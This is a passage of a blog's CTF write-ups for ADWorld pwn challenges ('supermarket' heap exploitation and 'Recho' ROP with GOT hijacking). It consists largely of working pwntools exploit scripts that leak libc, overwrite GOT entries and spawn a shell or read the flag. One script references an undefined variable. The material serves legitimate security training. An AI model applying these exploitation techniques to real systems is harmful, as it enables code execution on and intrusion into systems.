class="string">&#x27;price:&#x27;</span>,price)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,descrip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">name,newsize,descrip</span>):</span> <span class="comment"># change description</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(newsize))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,descrip)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;commodity 0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0x80</span>,<span class="string">&#x27;description 0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;commodity 1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0x20</span>,<span class="string">&#x27;description 1&#x27;</span>)</span><br><span class="line">change(<span class="string">&#x27;commodity 0&#x27;</span>,<span class="number">0x90</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># must using &#x27;&#x27; instead of some string,</span></span><br><span class="line"><span class="comment"># because `description 0` has been released (freed) ,</span></span><br><span class="line"><span class="comment"># and anything you write will overwrite `fd` and `bk` in it.</span></span><br><span class="line">add(<span class="string">&#x27;commodity 2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">0x80</span>,<span class="string">&#x27;description 2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cname = <span class="string">&#x27;fake&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">cprice = p32(<span class="number">4</span>)</span><br><span class="line">cdescrip_size = p32(<span class="number">0x80</span>)</span><br><span class="line">cdescription = p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload = cname + cprice + cdescrip_size + cdescription</span><br><span class="line">change(<span class="string">&#x27;commodity 0&#x27;</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;fake: price.4, des.&#x27;</span>)</span><br><span class="line">atoi_addr = u32(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_addr = atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; using LibcSearcher</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line"><span class="string">libc_base = atoi_addr - libc.dump(&#x27;atoi&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">change(<span class="string">&#x27;fake&#x27;</span>,<span class="number">0x80</span>,p32(system_addr))</span><br><span class="line"><span class="comment"># remain the size to avoid trouble.</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Or hijack <code>free</code> in <code>GOT</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./supermarket&#x27;</span>)  </span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;31614&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./supermarket&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)  </span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;price:&#x27;</span>,<span class="string">&#x27;10&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line">create(<span class="string">&#x27;tmp&#x27;</span>,<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;tmp&#x27;</span>)  <span class="comment"># fill `free` in `got`</span></span><br><span class="line">create(<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>) <span class="comment"># prepare parameter for getshell</span></span><br><span class="line"><span class="comment">#node0  </span></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#node1 (prevent from chunck merging)</span></span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#realloc node0-&gt;description    </span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="comment">#allocate node2 to node0-&gt;description </span></span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line">payload = <span class="string">&#x27;2&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>) + p32(<span class="number">20</span>) + p32(<span class="number">0x20</span>) + p32(free_got)    </span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)  </span><br><span class="line">show()  </span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;2: price.20, des.&#x27;</span>)  </span><br><span class="line">r = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> r+<span class="string">&#x27;;&#x27;</span>+<span class="built_in">len</span>(r)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(u32(r[:<span class="number">4</span>]))+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">hex</span>(u32(r[<span class="number">4</span>:<span class="number">8</span>]))+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">hex</span>(u32(r[<span class="number">8</span>:<span class="number">12</span>]))</span><br><span class="line">free_addr = u32(r1)  </span><br><span class="line"></span><br><span class="line">libc_addr = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc addr:&#x27;</span> + <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;sys addr:&#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x20</span>,p32(system_addr))  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">delete(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
<p>Or even leak <code>__libc_start_main</code> and hijack it, only using heap overflow:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p =remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;31614&#x27;</span>)</span><br><span class="line">got = <span class="number">0x804b038</span> <span class="comment"># `got` item of `__libc_start_main`</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,price,descrip_size,description</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_price</span>(<span class="params">name,price</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_des</span>(<span class="params">name,descrip_size,description</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span>():</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;A&quot;</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;AAAA&quot;</span>)    </span><br><span class="line">change_des(<span class="string">&quot;A&quot;</span>,<span class="number">8</span>,<span class="string">&quot;C&quot;</span>*<span class="number">7</span>+<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span>*<span class="number">12</span>+ p32(<span class="number">0x21</span>) + p32(<span class="number">0x42</span>) + <span class="string">&quot;B&quot;</span>*<span class="number">12</span> + p32(<span class="number">0x00</span>) +p32(<span class="number">0x100</span>) +p32(got)</span><br><span class="line">change_des(<span class="string">&#x27;A&#x27;</span>,<span class="number">100</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;B: price.0, des.&quot;</span>)</span><br><span class="line">addr = p.recvn(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;addr:&quot;</span>,<span class="built_in">hex</span>(u32(addr))</span><br><span class="line">libc = u32(addr) - <span class="number">0x18540</span><span class="comment">#0x49020</span></span><br><span class="line">system_addr = libc + <span class="number">0x3a940</span></span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;libc:&quot;</span>,<span class="built_in">hex</span>(libc)</span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;system_addr:&quot;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">change_des(<span class="string">&quot;B&quot;</span>,<span class="number">0x100</span>,p32(system_addr)*<span class="number">5</span>)<span class="comment">#+&#x27;\n&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>ctf</tag>
        <tag>uaf</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (GOT Hijacking)</title>
    <url>/2020/08/29/2020-08-29-ADWorld-PWN-Challenge-Area-Write-ups-GOT-Hijacking/</url>
    <content><![CDATA[<p>Challenges here need to hijack <code>GOT</code>.</p>
<h2 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h2><p>Attachment: <a href="/filehost/apcaw/recho">recho</a><br>Description: None</p>
<p>A <code>ROP</code> challenge with <code>syscall</code> and other tricks.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file recho</span><br><span class="line">recho: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6696795a3d110750d6229d85238cad1a67892298, not stripped</span><br><span class="line">$ checksec recho</span><br><span class="line">[*] &#x27;/root/recho&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Welcome to Recho server!\n&quot;</span>, <span class="number">0x19</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">0x10</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">atoi</span>(&amp;nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">15</span> )</span><br><span class="line">      v7 = <span class="number">16</span>;</span><br><span class="line">    v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, v7);</span><br><span class="line">    buf[v6] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Useful addresses:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># flag string</span><br><span class="line">.data:0000000000601058 flag            db &#x27;flag&#x27;,0</span><br><span class="line"># plt table</span><br><span class="line">.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0000000000601020 off_601020      dq offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0000000000601028 off_601028      dq offset alarm         ; DATA XREF: _alarm↑r</span><br><span class="line">.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0000000000601038 off_601038      dq offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0000000000601040 off_601040      dq offset atoi          ; DATA XREF: _atoi↑r</span><br></pre></td></tr></table></figure>

<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>The biggest challenge is, there is an endless <code>while</code> loop receiving inputs all the time. though we have a chance to do stack overflow (it reads unlimited chars to <code>buf</code>, which is only <code>0x30</code> bytes away from <code>rbp</code>), we dont have a chance to get out of <code>while</code> loop to exit.</p>
<p>Thankfully, in <code>pwntools</code> it has <code>shutdown</code> method to close the stream:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shutdown(self, direction)</span><br><span class="line"><span class="string">&quot;direction must be in [&#x27;in&#x27;, &#x27;out&#x27;, &#x27;read&#x27;, &#x27;recv&#x27;, &#x27;send&#x27;, &#x27;write&#x27;]&quot;</span></span><br></pre></td></tr></table></figure>
<p>However after closing stream, there will be no further interaction, so no way to leak <code>libc</code> or so. But this program has no <code>system</code>, so we can only build a one-time <code>ROP</code> chain to read <code>flag</code> and output it.</p>
<p>There is a tip for <code>alarm</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gdb -q /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">pwndbg: loaded 177 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from /usr/lib/x86_64-linux-gnu/libc.so.6...</span><br><span class="line">Reading symbols from /usr/lib/debug/.build-id/9c/9b4c997fbbff4ea98320bb8c286051f9ed6513.debug...</span><br><span class="line">pwndbg&gt; disassemble alarm</span><br><span class="line">Dump of assembler code for function alarm:</span><br><span class="line">   0x00000000000cb2d0 &lt;+0&gt;:     mov    eax,0x25</span><br><span class="line">   0x00000000000cb2d5 &lt;+5&gt;:     syscall</span><br><span class="line">   0x00000000000cb2d7 &lt;+7&gt;:     cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x00000000000cb2dd &lt;+13&gt;:    jae    0xcb2e0 &lt;alarm+16&gt;</span><br><span class="line">   0x00000000000cb2df &lt;+15&gt;:    ret</span><br><span class="line">   0x00000000000cb2e0 &lt;+16&gt;:    mov    rcx,QWORD PTR [rip+0xf2b89]        # 0x1bde70</span><br><span class="line">   0x00000000000cb2e7 &lt;+23&gt;:    neg    eax</span><br><span class="line">   0x00000000000cb2e9 &lt;+25&gt;:    mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x00000000000cb2ec &lt;+28&gt;:    or     rax,0xffffffffffffffff</span><br><span class="line">   0x00000000000cb2f0 &lt;+32&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>A <code>syscall</code> locates at the 5 offsets of the <code>alarm</code> start, we can use that by overwriting <code>alarm</code> in <code>GOT</code> as <code>syscall</code> (just add <code>0x5</code> to it is ok) and call it. It can be called <code>GOT</code> hijacking.<br>Search <code>add</code> gadgets:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary recho --only &quot;add|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004008af : add bl, dh ; ret</span><br><span class="line">0x00000000004008ad : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004008ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004008ac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400830 : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x00000000004008ae : add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000004006f8 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x000000000040070d : add byte ptr [rdi], al ; ret</span><br><span class="line">0x0000000000400832 : add cl, cl ; ret</span><br><span class="line">0x00000000004006f4 : add eax, 0x20098e ; add ebx, esi ; ret</span><br><span class="line">0x000000000040070a : add eax, 0x70093eb ; ret</span><br><span class="line">0x00000000004006f9 : add ebx, esi ; ret</span><br><span class="line">0x00000000004005b3 : add esp, 8 ; ret</span><br><span class="line">0x00000000004005b2 : add rsp, 8 ; ret</span><br><span class="line">0x00000000004005b6 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure>
<p>And search <code>pop</code> gadgets:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary recho --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x00000000004006fc : pop rax ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400690 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004006fe : pop rdx ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b6 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>
<p>As for <code>system call</code> number you can check <code>/usr/include/asm/unistd_32.h</code> and <code>/usr/include/asm/unistd_64.h</code> for <code>32-bit</code> and <code>64-bit</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ more /usr/include/asm/unistd_64.h</span><br><span class="line">#ifndef _ASM_X86_UNISTD_64_H</span><br><span class="line">#define _ASM_X86_UNISTD_64_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_read 0</span><br><span class="line">#define __NR_write 1</span><br><span class="line">#define __NR_open 2</span><br><span class="line">#define __NR_close 3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Considering flag{xxxxxx} is saved <code>flag</code> and we have a string <code>flag</code> in <code>.data</code>, we can <code>open</code> (<code>syscall</code> number 2) it to get content.</p>
<p>So we build <code>ROP</code> chain to execute <code>fd=open(&#39;flag&#39;,READONLY)</code>, <code>read(fd,stdin_buffer,100)</code> and <code>write(1,bss,0x40)</code> one by one.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>The script was written according to our exploit path: </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./recho&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43839</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./recho&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line">pop_rdx = <span class="number">0x04006fe</span></span><br><span class="line">pop_rax = <span class="number">0x04006fc</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x04008a1</span></span><br><span class="line">add_rax = <span class="number">0x04008ae</span></span><br><span class="line">add_rcx = <span class="number">0x04006f8</span></span><br><span class="line">add_rdi = <span class="number">0x040070d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite got</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>) + p64(pop_rax)+p64(<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])</span><br><span class="line">payload += p64(add_rdi)</span><br><span class="line"><span class="comment"># fd = open(&#x27;flag&#x27;, READONLY)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(elf.sym[<span class="string">&#x27;flag&#x27;</span>]) <span class="comment"># rdi = flag</span></span><br><span class="line">payload += p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)   <span class="comment"># rsi = 0 (READONLY)</span></span><br><span class="line">payload += p64(pop_rax)+p64(<span class="number">2</span>)              <span class="comment"># rax = 2 (syscall number of open)</span></span><br><span class="line"><span class="comment"># syscall parameter passing order:rdi, rsi, rdx, r10, r9, r8</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;alarm&#x27;</span>])</span><br><span class="line"><span class="comment"># read(fd,stdin_buffer,100) , move flag content to .bss</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>) <span class="comment"># fd returned by open starts from 3</span></span><br><span class="line">payload += p64(pop_rsi_r15)+p64(elf.bss())+p64(<span class="number">0</span>) <span class="comment"># rsi = bss</span></span><br><span class="line">payload += p64(pop_rdx)+p64(<span class="number">100</span>) <span class="comment"># length</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># write(1,bss,0x40) , print flag</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)+p64(elf.bss())+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx)+p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to Recho server!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.shutdown(<span class="string">&#x27;send&#x27;</span>) <span class="comment"># or: in, out, recv, read, write</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h2><p>Attachment: <a href="/filehost/apcaw/note-service2">note-service2</a><br>Description: None</p>
<p>A heap challenge with array out of bounds.</p>
<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file note-service2</span><br><span class="line">note-service2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped</span><br><span class="line">$ checksec note-service2</span><br><span class="line">[*] &#x27;/root/note-service2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
